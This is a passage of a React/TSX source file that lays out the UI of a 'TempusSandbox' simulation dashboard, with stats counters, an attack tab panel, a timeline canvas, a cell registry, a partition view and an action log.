                    onChange={e => set(+e.target.value)} style={{ accentColor:'#58E6D9' }} />
                  <span style={{ fontSize:10, color:'#58E6D9', textAlign:'right' }}>{fmt(val)}{unit}</span>
                </div>
              ))}
              {/* progress */}
              <div>
                <div style={{ background:'rgba(255,255,255,0.05)', height:2, borderRadius:1 }}>
                  <div style={{ background:'#58E6D9', height:'100%', borderRadius:1,
                                width:`${pct}%`, transition:'width 0.1s' }} />
                </div>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', marginTop:7 }}>
                  {[
                    ['EVENTS',   `${stats.total}/${nEvents}`],
                    ['DISPATCH', String(stats.dispatched)],
                    ['ANOMALY',  String(stats.anomalies)],
                    ['STATUS',   stats.done ? 'DONE' : running ? 'RUN' : 'IDLE'],
                  ].map(([k, v]) => (
                    <div key={k} style={{ textAlign:'center' }}>
                      <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', textTransform:'uppercase' }}>{k}</div>
                      <div style={{ fontSize:11, color:
                        k==='STATUS' && running ? '#58E6D9' :
                        k==='ANOMALY' && stats.anomalies > 0 ? '#ef4444' :
                        'rgba(255,255,255,0.55)' }}>{v}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>)}

          {/* ATTACK tab */}
          {leftTab === 'attack' && (
            <div style={{ flex:1, overflow:'hidden', display:'flex', flexDirection:'column' }}>
              <AttackPanel cells={parsedProg?.cells ?? new Map()} />
            </div>
          )}
        </div>

        {/* ── RIGHT ── */}
        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden', minWidth:0 }}>

          <StateStrip
            phase={liveState.phase}
            cycle={liveState.cycle}
            lastDP={liveState.lastDP}
            activeCell={liveState.activeCell}
            lastAction={liveState.lastAction}
            colors={colors}
          />

          {/* 3-col grid: [timeline(span2) | registry] / [partition(span2) | log] */}
          <div style={{
            flex:1, display:'grid',
            gridTemplateColumns:'1fr 1fr 260px',
            gridTemplateRows:'1fr 1fr',
            gap:1, background:'rgba(255,255,255,0.04)',
            minHeight:0, overflow:'hidden',
          }}>
            {/* ΔP timeline — spans cols 1-2, row 1 */}
            <div style={{ gridColumn:'1 / 3', gridRow:'1', background:'#030705', overflow:'hidden' }}>
              <canvas ref={dpRef} style={{ width:'100%', height:'100%', display:'block' }} />
            </div>

            {/* cell registry — col 3, row 1 */}
            <div style={{ gridColumn:'3', gridRow:'1', background:'#030705', overflow:'hidden' }}>
              {parsedProg ? (
                <CellRegistry
                  cells={parsedProg.cells}
                  colors={colors}
                  whens={parsedProg.whens}
                  counts={cellCounts}
                  activeCell={liveState.activeCell}
                />
              ) : (
                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                              fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
                  compile to see registry
                </div>
              )}
            </div>

            {/* ΔP partition — spans cols 1-2, row 2 */}
            <div style={{ gridColumn:'1 / 3', gridRow:'2', background:'#030705', overflow:'hidden' }}>
              {parsedProg ? (
                <DpPartition
                  cells={parsedProg.cells}
                  colors={colors}
                  counts={cellCounts}
                  lastDP={liveState.lastDP}
                />
              ) : (
                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                              fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
                  ΔP partition
                </div>
              )}
            </div>

            {/* action log — col 3, row 2 */}
            <div style={{ gridColumn:'3', gridRow:'2', background:'#030705', overflow:'hidden' }}>
              <ActionLog entries={actionLog} />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

TempusSandbox.getLayout = (page: React.ReactElement) => page;
export default TempusSandbox;
